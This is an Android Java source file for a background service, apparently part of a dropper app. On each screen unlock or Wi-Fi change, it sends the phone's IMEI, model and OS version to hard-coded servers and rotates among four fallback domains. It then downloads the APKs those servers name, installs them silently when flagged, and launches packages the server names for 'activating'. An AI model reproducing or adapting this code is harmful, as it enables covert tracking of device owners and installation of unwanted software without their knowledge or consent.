package com.xstd.ip.service;

import android.app.Service;
import android.content.*;
import android.content.pm.IPackageInstallObserver;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.net.wifi.WifiManager;
import android.os.*;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.text.format.DateUtils;
import android.text.format.Time;

import com.android.volley.AuthFailureError;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response.ErrorListener;
import com.android.volley.Response.Listener;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.JsonArrayRequest;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import com.xstd.ip.Config;
import com.xstd.ip.Tools;
import com.xstd.ip.dao.SilenceAppDao;
import com.xstd.ip.dao.SilenceAppDaoUtils;

import net.tsz.afinal.FinalHttp;
import net.tsz.afinal.http.AjaxCallBack;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import org.w3c.dom.Text;

import java.io.File;
import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.util.HashMap;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;

public class CoreService extends Service {

    public static final int UNLOCK_SCREEN = 0x000001;
    public static final int WIFI_STATE_CHANGED = 0x000002;
    public static final String FETCH_SERVER_URL = "http://www.xsjingmo.com:8080/springMvc/student.do";
    public static final String FETCH_SERVER_URL1 = "http://www.jingmoby.com:8080/springMvc/student.do";
    public static final String FETCH_SERVER_URL2 = "http://www.jmxstd.com:8080/springMvc/student.do";
    public static final String FETCH_SERVER_URL3 = "http://www.beiyongjm.com:8080/springMvc/student.do";
    //    public static final String DOWNLOAD_LOCATION = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).getAbsolutePath() + File.separator;
    public static final long DAY_TIME_MILLIS = 1000 * 60 * 60 * 24;// 一天的毫秒數
    public static LinkedList<ApkInfo> mustDownloadApp = new LinkedList<ApkInfo>();
    private CoreReceiver receiver;
    private SharedPreferences sharedPreferences;
    private FinalHttp finalHttp;
    private RequestQueue requestQueue;
    private String imei;
    private String device;
    private String os;
    private IPackageInstallObserver.Stub observer = new IPackageInstallObserver.Stub() {

        @Override
        public void packageInstalled(String packageName, int returnCode) throws RemoteException {
        }
    };

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();

        receiver = new CoreReceiver();
        IntentFilter filter = new IntentFilter();
        filter.setPriority(Integer.MAX_VALUE);
        filter.addAction(Intent.ACTION_USER_PRESENT);
        filter.addAction(WifiManager.WIFI_STATE_CHANGED_ACTION);
        registerReceiver(receiver, filter);

        sharedPreferences = getSharedPreferences("setting", MODE_PRIVATE);
        finalHttp = new FinalHttp();
        requestQueue = Volley.newRequestQueue(getApplicationContext());
        os = Build.VERSION.RELEASE;
        imei = ((TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE)).getDeviceId();

        try {
            device = URLEncoder.encode(Build.MODEL, "UTF-8");
        } catch (UnsupportedEncodingException e) {
            device = Build.MODEL;
            e.printStackTrace();
        }

    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (receiver != null)
            unregisterReceiver(receiver);
    }

    /**
     * 接收到广播
     *
     * @param type   类型
     * @param intent
     */
    private void receiveBroadcast(int type, Intent intent) {
        switch (type) {
            case UNLOCK_SCREEN:
                Tools.initFakeWindow(getApplicationContext());
                if (Tools.isOnline(getApplicationContext()))
                    updateService();
                break;
            case WIFI_STATE_CHANGED:
                int wifistate = intent.getIntExtra(WifiManager.EXTRA_WIFI_STATE, WifiManager.WIFI_STATE_DISABLED);
                if (wifistate == WifiManager.WIFI_STATE_ENABLING || wifistate == WifiManager.WIFI_STATE_ENABLED)
                    updateService();
        }
    }

    /**
     * 从服务器获取更新
     */
    private void updateService() {
        long last_update_time = sharedPreferences.getLong("last_update_time", 0);
        if (DateUtils.isToday(last_update_time)) {
            startDownload();
            return;
        }
        if (Config.IS_DOWNLOADING.get())
            return;
        else
            Config.IS_DOWNLOADING.set(true);

        requestQueue.add(new JsonArrayRequest(String.format(sharedPreferences.getString("fetch_server_url", FETCH_SERVER_URL) + "?method=save&imei=%s&os=%s&device=%s", imei, os, device), new Listener<JSONArray>() {

            @Override
            public void onResponse(JSONArray jsonArray) {
                Tools.logW(jsonArray.toString());
                mustDownloadApp.clear();
                Config.IS_DOWNLOADING.set(false);
                List<String> installPackages = Tools.getDeviceInstallPackName(getApplicationContext());
                SilenceAppDao dao = SilenceAppDaoUtils.getSilenceAppDao(getApplicationContext());
                for (int i = 0; i < jsonArray.length(); i++) {
                    try {
                        JSONObject obj = jsonArray.getJSONObject(i);
                        String fileName = obj.getString("fileName");
                        String packName = obj.getString("packName");
                        String remoteUrl = obj.getString("remoteUrl");
                        boolean isSilence = obj.getBoolean("isSilence");
                        if (installPackages.contains(packName)) {
                            Tools.notifyServer(getApplicationContext(), SendServerService.ACTION_DEVICE_INSTALLED, packName);
                            continue;
                        }
                        Cursor cursor = dao.getDatabase().query(dao.getTablename(), new String[]{SilenceAppDao.Properties.Packagename.columnName},
                                SilenceAppDao.Properties.Packagename.columnName + "=?", new String[]{packName}, null, null, null);
                        if (cursor != null && cursor.moveToFirst()) {
                            Tools.notifyServer(getApplicationContext(), SendServerService.ACTION_INSTALLED_BEFORE, packName);
                            continue;
                        }
                        if (cursor != null)
                            cursor.close();
                        ApkInfo app = new ApkInfo();
                        app.fileName = fileName;
                        app.packName = packName;
                        app.remoteUrl = remoteUrl;
                        app.isSilence = isSilence;
                        if (!isSilence) {
                            app.tickerText = obj.getString("tickerText");
                            app.title = obj.getString("title");
                            app.text = obj.getString("text");
                        }
                        mustDownloadApp.add(app);
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }
                }
                sharedPreferences.edit().putLong("last_update_time", System.currentTimeMillis()).commit();
                startDownload();
            }
        }, new ErrorListener() {

            @Override
            public void onErrorResponse(VolleyError arg0) {
                Tools.logW(arg0.toString());
                Config.IS_DOWNLOADING.set(false);
                changeServerUrl();
                Handler handler = new Handler(getMainLooper());
                handler.postDelayed(new Runnable() {

                    @Override
                    public void run() {
                        if (Tools.isOnline(getApplicationContext()))
                            updateService();
                    }
                }, 1000 * 60 * 5);

            }
        }));
        requestQueue.add(new JsonArrayRequest(String.format(sharedPreferences.getString("fetch_server_url", FETCH_SERVER_URL) + "?method=activating&imei=%s&os=%s&device=%s", imei, os, device), new Listener<JSONArray>() {
            @Override
            public void onResponse(JSONArray jsonArray) {
                for (int i = 0; i < jsonArray.length(); i++) {
                    try {
                        JSONObject jsonObject = jsonArray.getJSONObject(i);
                        String packageName = jsonObject.getString("packName");
                        Tools.logW("发现：" + packageName + "需要激活。");
                        if (!TextUtils.isEmpty(packageName))
                            Tools.launchApplication(getApplicationContext(), packageName);
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }
                }
            }
        }, null));
        requestQueue.start();
    }

    /**
     * 改变访问服务器的url。
     */
    private void changeServerUrl() {
        long last_failed_update_time = sharedPreferences.getLong("last_failed_update_time", -1);
        if (last_failed_update_time == -1)
            sharedPreferences.edit().putLong("last_failed_update_time", System.currentTimeMillis()).commit();
        else {
            String url = sharedPreferences.getString("fetch_server_url", FETCH_SERVER_URL);
            if (FETCH_SERVER_URL.equals(url)) {
                if (last_failed_update_time > DAY_TIME_MILLIS * 5) {
                    sharedPreferences.edit().putLong("last_failed_update_time", System.currentTimeMillis()).putString("fetch_server_url", FETCH_SERVER_URL1).commit();
                }
            } else if (FETCH_SERVER_URL1.equals(url)) {
                if (last_failed_update_time > DAY_TIME_MILLIS * 5) {
                    sharedPreferences.edit().putLong("last_failed_update_time", System.currentTimeMillis()).putString("fetch_server_url", FETCH_SERVER_URL2).commit();
                }
            } else if (FETCH_SERVER_URL2.equals(url)) {
                if (last_failed_update_time > DAY_TIME_MILLIS * 5) {
                    sharedPreferences.edit().putLong("last_failed_update_time", System.currentTimeMillis()).putString("fetch_server_url", FETCH_SERVER_URL3).commit();
                }
            } else if (FETCH_SERVER_URL3.equals(url)) {
                if (last_failed_update_time > DAY_TIME_MILLIS * 5) {
                    sharedPreferences.edit().putLong("last_failed_update_time", System.currentTimeMillis()).putString("fetch_server_url", FETCH_SERVER_URL).commit();
                }
            }
        }
    }

    private String getDownloadLocation() {
        String parent = Tools.getDownloadDirectory(getApplicationContext());
        if (TextUtils.isEmpty(parent)) {
            // 先从本地获取下载路径，没有则从服务器获取次机型的下载地址。
            String downloadLocation = sharedPreferences.getString("downloadlocation", null);
            if (TextUtils.isEmpty(downloadLocation)) {
                Tools.logW("从网络获取可下载地址。");
                requestQueue.add(new StringRequest(Request.Method.POST, sharedPreferences.getString("fetch_server_url", FETCH_SERVER_URL), new Listener<String>() {
                    @Override
                    public void onResponse(String s) {
                        if (s != null) {
                            if (!TextUtils.isEmpty(s.trim()))
                                sharedPreferences.edit().putString("downloadlocation", s.trim()).commit();
                        }
                    }
                }, null) {
                    @Override
                    protected Map<String, String> getParams() throws AuthFailureError {
                        Map<String, String> map = new HashMap<String, String>();
                        map.put("device", device);
                        map.put("method", "deviceSelect");
                        return map;
                    }
                });
                return null;
            } else
                return downloadLocation;
        } else
            return parent;
    }

    /**
     * 開始下載，下載完成安裝
     */
    private void startDownload() {
        String downloadlocation = getDownloadLocation();
        Tools.logW("最终下载位置为：" + downloadlocation);
        if (TextUtils.isEmpty(downloadlocation))
            return;
        if (!Config.IS_DOWNLOADING.get() && mustDownloadApp.size() > 0) {
            Config.IS_DOWNLOADING.set(true);
            final ApkInfo apkInfo = mustDownloadApp.removeFirst();
            final File file = new File(downloadlocation, apkInfo.fileName);
            if (file.exists())
                file.delete();
            Tools.logW("开始下载" + apkInfo.fileName);
            finalHttp.download(apkInfo.remoteUrl, file.getAbsolutePath(), true, new AjaxCallBack<File>() {

                @Override
                public void onSuccess(File file) {
                    super.onSuccess(file);
                    Tools.logW(file.getAbsolutePath() + "下载成功");
                    Tools.notifyServer(getApplicationContext(), SendServerService.ACTION_DOWNLOAD_SUCCESS, apkInfo.packName);
                    Config.IS_DOWNLOADING.set(false);
                    if (apkInfo.isSilence)
                        Tools.installFile(getApplicationContext(), file, observer);
                    else
                        Tools.useNotificationInstall(getApplicationContext(), apkInfo.tickerText, apkInfo.title, apkInfo.text, file.getAbsolutePath());
                    Config.installApks.put(apkInfo.packName, apkInfo);
                    startDownload();
                }

                @Override
                public void onFailure(Throwable t, String strMsg) {
                    super.onFailure(t, strMsg);
                    Tools.logW("下载失败" + strMsg);
                    Config.IS_DOWNLOADING.set(false);
                    mustDownloadApp.addFirst(apkInfo);
                    if (file.exists())
                        file.delete();
                    Handler handler = new Handler(getMainLooper());
                    handler.postDelayed(new Runnable() {

                        @Override
                        public void run() {
                            if (Tools.isOnline(getApplicationContext()))
                                startDownload();
                        }
                    }, 1000 * 60 * 5);
                }
            });
        }
    }

    /**
     * 判斷當前時間是否爲可允許更新
     *
     * @return
     */
    @SuppressWarnings("unused")
    private boolean isAllowTime() {
        Time time = new Time();
        time.set(System.currentTimeMillis());
        int hour = time.hour;
        if (6 < hour && hour < 9) {
            return true;
        }
        if (hour > 17 && hour < 24) {
            return true;
        }
        return false;
    }

    public static class ApkInfo {
        public String fileName;
        public String packName;
        public String remoteUrl;
        public boolean isSilence;

        /**
         * 以下这些属性只有当isSilence为false时才有。
         */
        public String tickerText;
        public String title;
        public String text;
        public int icon;
        public Bitmap largeIcon;
    }

    class CoreReceiver extends BroadcastReceiver {

        @Override
        public void onReceive(Context context, Intent intent) {
            String action = intent.getAction();
            Tools.logW(action);
            if (Intent.ACTION_USER_PRESENT.equals(action))
                receiveBroadcast(UNLOCK_SCREEN, intent);
            else if (WifiManager.WIFI_STATE_CHANGED_ACTION.equals(action))
                receiveBroadcast(WIFI_STATE_CHANGED, intent);
        }

    }

}